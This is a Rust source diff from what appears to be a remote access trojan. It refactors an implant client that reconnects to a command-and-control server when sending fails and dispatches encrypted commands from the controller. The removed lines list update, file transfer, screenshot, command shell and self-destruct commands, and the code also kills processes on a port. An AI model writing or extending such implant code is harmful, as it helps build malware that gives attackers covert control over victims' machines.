@@ -3,7 +3,7 @@ mod hybrid_crypto;
 
 use std::time::Duration;
 
-use feature::{update::Update, Feature};
+use feature::{find_feature_by_command, update::Update};
 use futures_util::{
     stream::{SplitSink, SplitStream},
     SinkExt, StreamExt,
@@ -48,12 +48,19 @@ impl Connector {
         }
     }
     pub async fn send_message(&mut self, message: String) {
-        self.write
+        match self
+            .write
             .as_mut()
             .unwrap()
             .send(Message::Text(message.into()))
             .await
-            .unwrap();
+        {
+            Ok(_) => {}
+            Err(error) => {
+                println!("Broken pipe or smth: {error}");
+                Box::pin(self.search_for_c2()).await;
+            }
+        }
     }
     pub fn kill_process_on_port(&self, port: u16) {
         let af_flags = AddressFamilyFlags::IPV4 | AddressFamilyFlags::IPV6;
@@ -118,40 +125,21 @@ impl Connector {
     pub async fn subscribe_to_updates(&mut self) {
         loop {
             let decrypted_message = self.accept_message().await;
-            match std::str::from_utf8(&decrypted_message).unwrap() {
-                "update" => {
-                    println!("got an update request");
-                    let update = Update::new();
-                    //send callback
-                    //TODO! make sending callback into separate method ot smth
-                    match update.run(self).await {
-                        feature::Result::SUCCESFUL => {
-                            self.send_hybrid_encryption(
-                                self.public_key.clone().unwrap(),
-                                "SUCCESFUL".as_bytes().to_vec(),
-                            )
-                            .await;
-                        }
-                        feature::Result::FAILED => {
-                            self.send_hybrid_encryption(
-                                self.public_key.clone().unwrap(),
-                                "FAILED".as_bytes().to_vec(),
-                            )
-                            .await;
-                        }
-                    }
-                }
-                "start_file_transfer" => {}
-                "send_screenshot" => {}
-                "open_cmd" => {}
-                "self_destruct" => {}
-                _ => {
-                    println!(
-                        "Got unrecognisible command, message:{}",
-                        std::str::from_utf8(decrypted_message.as_slice()).unwrap()
+            match find_feature_by_command(std::str::from_utf8(&decrypted_message).unwrap(), self)
+                .await
+            {
+                Some(_) => break,
+                None => {
+                    self.send_hybrid_encryption(
+                        self.public_key.clone().unwrap(),
+                        "Couldnt recognise the command"
+                            .to_string()
+                            .as_bytes()
+                            .to_vec(),
                     )
+                    .await;
                 }
-            }
+            };
         }
     }
 
